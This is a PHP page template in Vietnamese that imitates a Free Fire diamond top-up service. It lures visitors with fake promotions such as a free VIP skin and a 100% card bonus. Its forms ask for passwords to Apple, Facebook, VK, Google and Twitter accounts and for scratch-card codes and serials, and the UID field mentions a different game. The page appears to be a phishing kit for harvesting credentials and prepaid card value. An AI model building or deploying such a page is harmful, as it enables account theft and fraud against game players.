<?php
require_once 'includes/header.php';
?>

<main>
    <div class="container">
        <div class="nap-ff-container">
            <h1>Free Fire</h1>
            <div class="alert">
                <p>Nạp kim cương Free Fire nhận ngay skin VIP SCAR CÁ MẬP ĐEN khi nạp thẻ lần đầu trong ngày với thẻ có mệnh giá từ 500.000đ trở lên.</p>
                <p>LƯU Ý: Mỗi tài khoản chỉ được hưởng ưu đãi một lần</p>
            </div>

            <h3>Chọn cách đăng nhập</h3>
            <div class="login-methods">
                <button id="uid-login-btn-page" class="active">UID</button>
                <button id="apple-login-btn-page">ID Apple</button>
                <button id="facebook-login-btn-page">Facebook</button>
                <button id="vk-login-btn-page">VK</button>
                <button id="google-login-btn-page">Google</button>
                <button id="twitter-login-btn-page">Twitter</button>
            </div>

            <div id="uid-login-form" class="login-form">
                <label for="uid">UID</label>
                <input type="text" id="uid" placeholder="Nhập UID tài khoản Liên Quân Mobile">
            </div>

            <div id="apple-login-form" class="login-form" style="display: none;">
                <label for="apple-id">ID Apple</label>
                <input type="text" id="apple-id" placeholder="ID Apple">
                <label for="apple-password">Mật khẩu</label>
                <input type="password" id="apple-password" placeholder="Mật khẩu">
            </div>

            <form id="facebook-login-form-page" class="login-form">
                <label for="facebook-username">Email hoặc số điện thoại</label>
                <input type="email" id="facebook-username" placeholder="Email hoặc số điện thoại" required>
                <label for="facebook-password">Mật khẩu</label>
                <input type="password" id="facebook-password" placeholder="Mật khẩu" required>
            </form>

            <div id="vk-login-form" class="login-form" style="display: none;">
                <label for="vk-username">Tên người dùng hoặc Email</label>
                <input type="text" id="vk-username" placeholder="Tên người dùng hoặc Email">
                <label for="vk-password">Mật khẩu</label>
                <input type="password" id="vk-password" placeholder="Mật khẩu">
            </div>

            <div id="google-login-form" class="login-form" style="display: none;">
                <label for="google-email">Email</label>
                <input type="email" id="google-email" placeholder="Email">
                <label for="google-password">Mật khẩu</label>
                <input type="password" id="google-password" placeholder="Mật khẩu">
            </div>

            <div id="twitter-login-form" class="login-form" style="display: none;">
                <label for="twitter-username">Tên người dùng</label>
                <input type="text" id="twitter-username" placeholder="Tên người dùng">
                <label for="twitter-password">Mật khẩu</label>
                <input type="password" id="twitter-password" placeholder="Mật khẩu">
            </div>

            <div class="payment-methods">
                <button class="active"><img src="img/garena-logo.png" alt="THE GARENA" style="width: 80px;"></button>
                <button>Viettel</button>
                <button>Vinaphone</button>
                <button>Mobifone</button>
                <button>Vietnamobile</button>
                <button>Gate</button>
                <button>Zing</button>
                <button>Vcoin</button>
            </div>

            <div class="card-details">
                <div class="price-list">
                    <h3>Giá</h3>
                    <ul>
                        <li><input type="radio" name="price" value="20000"> 20 000 VND</li>
                        <li><input type="radio" name="price" value="50000"> 50 000 VND</li>
                        <li><input type="radio" name="price" value="100000"> 100 000 VND</li>
                        <li><input type="radio" name="price" value="200000"> 200 000 VND</li>
                        <li><input type="radio" name="price" value="500000"> 500 000 VND</li>
                        <li><input type="radio" name="price" value="1000000"> 1 000 000 VND</li>
                    </ul>
                </div>
                <div class="points-list">
                    <h3>Thêm điểm</h3>
                    <ul>
                        <li>Không hỗ trợ</li>
                        <li>Kim cương x 566</li>
                        <li>Kim cương x 1 132 (+ 1 132)</li>
                        <li>Kim cương x 2 264 (+ 2 264)</li>
                        <li>Kim cương x 5 660 (+ 5 660)</li>
                        <li>Kim cương x 11 500 (+ 11 500)</li>
                    </ul>
                </div>
                <div class="card-form">
                    <label for="card-code">Mã thẻ</label>
                    <input type="text" id="card-code" placeholder="Nhập mã thẻ in dưới lớp tráng bạc">
                    <label for="serial">Số serial</label>
                    <input type="text" id="serial" placeholder="Nhập số serial in trên thẻ">
                    <button class="submit-btn">NẠP THẺ</button>
                </div>
            </div>
            <div class="promotion">
                <p>Khuyến mãi 100% giá trị thẻ cào khi nạp thẻ có mệnh giá từ 100.000đ trở lên.</p>
            </div>
        </div>
    </div>
</main>

<?php
require_once 'includes/footer.php';
?>